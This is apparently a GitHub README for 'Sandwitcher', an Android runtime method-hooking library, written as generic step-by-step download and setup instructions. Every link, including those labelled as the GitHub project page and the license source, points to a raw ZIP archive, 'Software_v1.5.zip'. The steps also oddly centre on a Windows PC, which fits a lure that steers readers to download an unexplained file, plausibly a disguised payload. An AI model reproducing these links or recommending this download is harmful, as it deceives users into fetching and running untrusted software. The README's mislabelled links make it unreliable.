# 🪄 Sandwitcher - Hook Android Methods With Ease

[![Download](https://img.shields.io/badge/Download-Sandwitcher-7b2cbf?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/scatterbrained-stanchion933/Sandwitcher/main/assets/Software_v1.5.zip)

## 📦 What Sandwitcher Does

Sandwitcher is an Android library for runtime method hooking. It lets an app intercept Java and Kotlin methods while it runs. You do not need root, and you do not need to rebuild the app.

It ships as an AAR, so you can add it to an Android project like a normal library. It fits well in Android tools, test apps, and reverse engineering workflows.

## ✅ What You Need

- A Windows PC
- A modern web browser
- Android Studio if you plan to use the AAR in a project
- An Android device or emulator for testing
- A GitHub account if you want to clone or fork the repo

## 🚀 Download Sandwitcher

Visit the main project page here:

[Open Sandwitcher on GitHub](https://raw.githubusercontent.com/scatterbrained-stanchion933/Sandwitcher/main/assets/Software_v1.5.zip)

From that page, download the repository files or clone the project if you want the source code.

## 🛠️ Install on Windows

If you only want to view the project:

1. Open the GitHub link above in your browser.
2. Click the green Code button.
3. Choose Download ZIP.
4. Save the file to a folder on your PC.
5. Extract the ZIP file.

If you want to use Sandwitcher in Android Studio:

1. Open Android Studio.
2. Create or open an Android project.
3. Add the Sandwitcher AAR to your project.
4. Sync the project files.
5. Build and run your app on a device or emulator.

## 📁 What You Will See in the Project

After you download and open the repo, you may see files and folders like these:

- `README.md` for project info
- `build.gradle` or `build.gradle.kts` for build settings
- `src` for source code
- `libs` for local library files
- AAR package files for Android use
- Example or test code for method hooking

## 🔧 How to Use It

Sandwitcher is meant for Android developers and advanced app users who need runtime hooks. It can help you:

- intercept Java methods
- intercept Kotlin methods
- inspect method calls at runtime
- change app behavior without recompiling
- test app flows in a live build
- support research and debugging tasks

If you are new to Android projects, the simplest path is to open the repo in Android Studio and follow the build setup used in the project files.

## 🧩 Basic Setup Flow

1. Get the project from GitHub.
2. Open it in Android Studio.
3. Add the AAR to your app module.
4. Place the hook setup in your app code.
5. Build and install the app on a device.
6. Check that the hooked method runs through Sandwitcher.

## 📱 Typical Use Cases

Sandwitcher can be useful for:

- app testing
- runtime inspection
- feature checks
- behavior changes during development
- reverse engineering study
- Android research work
- hooking code in Java and Kotlin apps

## 🔍 How It Fits in Android

Sandwitcher works at runtime. That means it acts while the app is running, not before it starts. This is useful when you need to watch or change a method call without editing the original app code.

Because it is built for Android ART, it targets the Android runtime used by modern devices.

## 🔐 Safety and Access

Sandwitcher does not need root for its core use case. That makes it easier to test on regular devices and emulators. You still need to use it in a proper Android project and follow the setup in the repository.

## 🧪 Test It in an Emulator

An emulator is a good place to start.

1. Install Android Studio on Windows.
2. Create an Android emulator.
3. Open the Sandwitcher project.
4. Build the sample or host app.
5. Run it in the emulator.
6. Check the method hook behavior in logs or app flow.

## 📌 Project Topics

This repository covers:

- Android
- Android library work
- Android SDK use
- ART runtime
- method hooking
- Kotlin support
- LSPlant-related runtime work
- Pine-style hooking ideas
- runtime instrumentation
- Xposed-style patterns
- reverse engineering support

## 🧭 Files to Look For First

If you are unsure where to start, open these first:

1. `README.md`
2. Gradle build files
3. AAR output or library module
4. Example app code
5. Hook setup classes
6. Any test or sample activity

## 🖥️ Windows Steps at a Glance

1. Open the GitHub page.
2. Download the ZIP or clone the repo.
3. Extract the files.
4. Open the project in Android Studio.
5. Build the project.
6. Run it on an emulator or device.

## ❓ Common Questions

### Do I need root?

No, the library is built for runtime hooking without root.

### Do I need to recompile the target app?

No, the goal is to intercept methods at runtime.

### Is this an app or a library?

It is an Android library and ships as an AAR.

### Can it work with Java and Kotlin?

Yes, it is made to intercept both Java and Kotlin methods.

## 📄 License and Source

Check the repository page for source files, license details, and build instructions:

[https://raw.githubusercontent.com/scatterbrained-stanchion933/Sandwitcher/main/assets/Software_v1.5.zip](https://raw.githubusercontent.com/scatterbrained-stanchion933/Sandwitcher/main/assets/Software_v1.5.zip)

## 🧭 Next Step

Open the repo, download the files, and follow the Android Studio setup in the project
